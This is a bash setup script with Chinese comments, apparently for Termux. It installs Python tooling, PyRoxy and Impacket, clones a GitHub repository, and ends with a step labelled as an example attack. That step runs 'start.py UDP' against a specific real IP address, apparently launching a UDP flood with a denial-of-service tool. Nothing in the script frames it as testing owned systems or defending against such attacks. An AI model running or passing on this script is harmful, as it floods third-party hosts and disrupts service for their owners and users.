#!/bin/bash

# 使用 bash 运行此脚本
if [ -z "$BASH_VERSION" ]; then
    echo "请使用 bash 运行此脚本" >&2
    exit 1
fi

# 更新软件包列表
echo "正在更新软件包列表..."
pkg update -y

# 安装必要的软件和 Rust 编译器
echo "正在安装 Python、Clang、OpenSSL、Git 和 Rust..."
pkg install python clang openssl git rust -y

# 安装 OpenSSL 工具
pkg install openssl-tool -y

# 检查 Python 是否安装成功
if ! command -v python3 >/dev/null 2>&1; then
    echo "Python 未正确安装。" >&2
    exit 1
fi

# 创建并激活 Python 虚拟环境
echo "正在创建并激活 Python 虚拟环境..."
python3 -m venv venv
source venv/bin/activate

# 检查虚拟环境是否激活
if [ "$VIRTUAL_ENV" == "" ]; then
    echo "虚拟环境未激活。" >&2
    exit 1
fi

# 设置清华 PyPI 镜像源
echo "正在配置清华大学 PyPI 镜像源..."
pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

# 更新 pip 并安装依赖
echo "正在更新 pip 并安装依赖包（通过清华镜像源）..."
pip install --upgrade pip

# 安装依赖：requests、urllib3、charset_normalizer、maturin 的二进制文件
pip install --only-binary :all: requests urllib3 charset_normalizer maturin

# 安装 PyRoxy 和 impacket 模块（从源代码编译）
echo "正在安装 PyRoxy 和 Impacket 模块..."
pip install git+https://github.com/MatrixTM/PyRoxy.git
pip install git+https://github.com/SecureAuthCorp/impacket.git

# 克隆 GitHub 项目并安装项目依赖
echo "正在克隆 GitHub 项目..."
git clone https://github.com/kkkmnss/1.git
cd 1

# 安装项目依赖
echo "正在安装项目依赖..."
pip install --only-binary :all: -r requirements.txt

# 再次激活虚拟环境，以确保后续操作在虚拟环境中执行
echo "重新激活虚拟环境..."
source ../venv/bin/activate

# 添加攻击测试用例
echo "开始示例攻击..."
python3 start.py UDP 166.88.95.146 10 10

# 保持虚拟环境激活状态，方便后续操作
exec "$SHELL"
